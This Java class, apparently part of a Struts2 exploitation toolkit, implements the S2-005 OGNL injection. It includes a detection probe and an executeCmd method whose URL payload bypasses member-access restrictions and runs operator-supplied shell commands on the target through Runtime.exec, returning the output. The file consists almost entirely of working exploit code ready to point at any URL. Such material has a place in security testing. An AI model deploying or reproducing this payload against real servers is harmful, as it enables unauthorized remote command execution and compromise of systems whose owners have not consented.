package com.example.exploit.struts2;

import cn.hutool.core.date.DateUtil;
import com.example.hutool.HttpResultResponse;
import com.example.hutool.HttpUtils;
import com.example.vulnerability.VulnerInterface;
import lombok.extern.slf4j.Slf4j;


import java.net.URLEncoder;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

/**
 *
 */
@Slf4j
public class S2_005 implements VulnerInterface {

    Map headersMap = new HashMap<String, String>();
    Map paramMap = new HashMap<String, Object>();
    private String url;


    private String pocPayload = "%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75%40java.util.Collections%40EMPTY_SET%27%29%28c%29%29=&%28b%29%28%28%27%5C43context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5C75false%27%29%28b%29%29=&%28g%29%28%28%27%5C43req%5C75%40org.apache.struts2.ServletActionContext%40getRequest%28%29%27%29%28d%29%29=&%28i2%29%28%28%27%5C43xman%5C75%40org.apache.struts2.ServletActionContext%40getResponse%28%29%27%29%28d%29%29=&%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%28" + 2 + "%2A" + 4444 + "%29%27%29%28d%29%29=&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29=";
    //private String payload = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43mycmd\\75\\'{EXEC}\\'')(d))&(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')(d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))";


    private String cmdPayload=  "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43mycmd\\75\\'whoami\\'')(d))&(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')(d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))";

    @Override
    public String executePOC(String url) throws Exception {
        StringBuilder realUrl=new StringBuilder();
        String nowTime = DateUtil.now();
        //1、设置请求头
        headersMap.put("Content-type", "application/x-www-form-urlencoded");

        //2、设置请求体
        String body = this.pocPayload;

        if(url.contains("?")){
            realUrl = new StringBuilder().append(url).append(body);
        }else{
            realUrl = new StringBuilder().append(url).append("?").append(body);

        }

        HttpResultResponse response = HttpUtils.get(realUrl.toString(), headersMap);
        if(null!=response.getBody() && response.getBody().contains("8888")) {
            return nowTime+" 目标==>"+url+"存在-->" + this.getClass().getSimpleName()
                    + "<--漏洞 \n\r"+response.getMessage()+": ==> "+response.getBody()+"\n\r"+"\n\r";
        }else {
            return nowTime+" 目标==>"+url+"不存在-->"  + this.getClass().getSimpleName() + "漏洞\n\r"+"\n\r";
        }
    }

    @Override
    public String executeCmd(String url , String cmd) throws Exception {
        StringBuilder realUrl=new StringBuilder();

        String nowTime = DateUtil.now();
        //1、设置请求头
        headersMap.put("Content-type", "application/x-www-form-urlencoded");

        //2、设置请求体
        String body = this.cmdPayload.replace("whoami", cmd);
        //body = URLEncoder.encode(body, "utf-8");

        if(url.contains("?")){
                realUrl = new StringBuilder().append(url).append(body);
        }else{
                realUrl = new StringBuilder().append(url).append("?").append(body);

        }
        //String response = HttpUtil.get(url, body, headersMap);
        HttpResultResponse response = HttpUtils.get(realUrl.toString(), headersMap);
        log.info("命令执行响应==>{}",response);
        if(null!=response.getBody()) {
            return nowTime+" ==> "+ this.getClass().getSimpleName() + "漏洞==>"+"执行的命令是："+cmd+"\n"+"\r执行结果：\n"+response.getBody();
        }else {
            return nowTime+" 目标==>"+url+"不存在-->"  + this.getClass().getSimpleName() + "漏洞\n";
        }

    }
}
